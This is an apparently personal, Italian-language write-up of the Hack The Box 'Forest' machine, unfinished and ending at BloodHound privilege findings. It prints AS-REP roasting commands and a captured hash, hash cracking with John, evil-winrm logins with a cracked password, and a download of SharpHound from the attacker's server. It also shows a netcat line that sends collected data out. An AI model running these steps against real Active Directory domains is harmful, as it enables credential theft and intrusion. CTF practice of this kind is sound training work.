## KRoasting

```
./GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request
```
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:ec4d096609a114fdd785e8801296118b$d4d812103974b1956e271eba42443d7c7a730d8b8d51a3c9f95e2c689f7cf8d14d2852e56bc450307450b6dc0a81bfd3b7aa12daf6e8272d4075326873068f5c5fedca2fb306364a47ce9419ca852b76d47acb4712d5adaa236bab4e868f306f5cbd35fc78af74708623c68374aefc3ba120217173f91f9eb352fff0ebec23d99a6d479a061eddd60a326e9e3ea68dac62f62314944ef34ee61f31cbf49c02fc1268312aee4e65baa231bdf33d353e7c6f221ce8e7e89a53158f5a8b2672a717231ee3f5040f2bd58dfba3b92132f9d5c331c921978b8b6375673b40ba2456737e8c7e16ed5c
```


--OPPURE--


```
python GetNPUsers.py htb.local/ -no-pass -usersfile ../../forest_user.txt -dc-ip 10.10.10.161
```

Il contenuto di forest_user.txt è dato da enum4linux. Tra cui c'è svc-alfresco che è l'unico per cui si riesce ad estrarre l'hash.


## PassTheHash (?)

Benissimo, ottenuto l'hash finalmente posso mettere in pratica una tecnica che ho sempre voluto provare: la PTH:

```
evil-winrm -u svc-alfresco -H "6a2929599dd19458e2c15587a7c870e5$d7a17216a7094b7ddece4533f3255c63b0906bfde35e2bdb75c40bff8f791a2a0d80d905e8d306a5d1e1060a9cb7c44f652caf14c7e74138259ddda20a9a1040a236d708f183cae602c195261bf614a381d822b11ecf3870becd7a1b4f7c9db4339023bf7aa7d5e7ddf00836385f075f52a814e63df0826a4b6937d3789bafa0c2c9735bbd9378b50125db20fad4a884b4e7f298cb5a8e244fa31b4c379a9131f4977ff4bd5a270e3d6e52e3ae32bdd550312cdba3ea40891033b330791bc3415a709fcd592165b3e4a6b0150a58f1ffe962a9a2783d4b973c99c118cae4535030169f2c8f63" -i 10.10.10.161
```

Come non detto, quella tecnica non funziona.

Rompo l'hash banalmente con John:

```
john --wordlist=rockyou.txt hash.txt
```

Ed entro con la password:

```
evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
```

A questo punto presa la tanta faticata user flag comincio con la fase di PrivEsc. Dato il nome della challenge capisco che devo interagire con l'Active Directory. Uso per tal motivo BloodHound.

## PrivEsc

Prima cosa che faccio è scaricare dentro \tmp l'exe necessario: SharpHound. Provo con un wget e curl ma non funzionano. Banalmente lo carico in una cartella 'pubblica' (python simplehttpserver) e lo scarico all'interno della macchina con:
```
Invoke-WebRequest http://IP:8000/SharpHound.exe -o SharpHound.exe
```
Lo eseguo con 
```
.\SharpHound.exe -c all
```
Lascio che prelevi tutto e che generi i vari due file (.zip e .bin). A questo punto sorge un problema! Come passare dalla macchina Win a Linux i due file? 


Con la stessa tecnica di prima carico dentro la macchina NetCat, quindi passo verso Kali i due file:
```
.\nc.exe -w 3 IP 9191 | 20200317113311_BloodHound.zip
```

A quanto pare il file .zip trasferito con NetCat risulta essere corrotto. Cercando un altro metodo per trasferire il file ho scoperto che Evil-WinRM contiene già due metodi "DOWNLOAD" e "UPLOAD". Ho usato questi per spostare l'archivio zip generato. A questo punto ho trascinato il file zip su BloodHound (assicurati che il DB sia in running con "sudo neo4j console" altrimenti non funzionerà), ho messo come nodo foglia 
```
SVC-ALFRESCO@HTB.LOCAL
```
e come nodo radice 
```
DOMAIN ADINS@HTB.LOCAL
```

Osservo l'albero dell'ActiveDirectory e scopro che l'utente ha di base due permessi ereditati (per errore?): 
* GenericAll
* WriteDACL

Li sfrutto per ? 
